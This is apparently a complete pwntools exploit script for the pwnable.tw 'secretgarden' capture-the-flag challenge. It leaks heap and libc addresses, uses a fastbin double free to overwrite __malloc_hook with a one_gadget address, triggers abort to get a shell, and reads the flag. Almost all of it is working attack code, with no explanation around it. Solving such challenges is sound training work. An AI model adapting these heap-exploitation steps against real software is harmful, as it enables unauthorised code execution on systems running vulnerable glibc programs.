#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10203
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./secretgarden_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	brva 0x0000000000000C65
        	brva 0x0000000000000CD3
        	brva 0x0000000000000F65
        	brva 0x0000000000000EB9
        	brva 0x0000000000000E74
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def raise_flower(size, name, color):
	p.sendafter(b'choice : ', str(1))
	p.sendlineafter(b'name :', str(size))
	p.sendafter(b'flower :', name)
	p.sendlineafter(b'flower :', color)

def show():
	p.sendafter(b'choice : ', str(2))

def free(idx):
	p.sendafter(b'choice : ', str(3))
	p.sendlineafter(b'garden:', str(idx))

def clean():
	p.sendafter(b'choice : ', str(4))

# VARIABLE


# PAYLOAD
raise_flower(0x420, b'a'*8, b'1234') # 0
raise_flower(0x20, b'b'*8, b'2345') # 1
free(1)
free(0)
clean()
raise_flower(0x28, b'1', b'1234') # 0
show()

p.recvuntil(b'flower[0] :')
heap_leak = u64(p.recv(6) + b'\0'*2)
heap_base = heap_leak - 0x1431
log.info("Heap base: " + hex(heap_base))

raise_flower(0x420, b'1', b'2345') # 1
show()

p.recvuntil(b'flower[1] :')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x3c3b31
log.info("Libc base: " + hex(libc.address))

raise_flower(0x65, b'a'*8, b'1234') # 2
raise_flower(0x65, b'b'*8, b'2345') # 3
raise_flower(0x65, b'c'*8, b'3456') # 4
free(3)
free(2)
free(3)
clean()

raise_flower(0x65, p64(libc.sym.__malloc_hook - 0x23), b'1234') # 2
raise_flower(0x65, b'a'*8, b'1234') # 3
raise_flower(0x65, b'b'*8, b'2345') # 4
gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
payload = flat(
	b'\0'*0xb,
	gadget[2] + libc.address
	)
raise_flower(0x65, b'a'*8 + payload, b'1234') # 5
# GDB()
# Trigger abort
# free -> __libc_free -> _int_free -> malloc_printerr 
free(4)
free(4)
p.sendline(b'cat /home/*/flag')

p.interactive()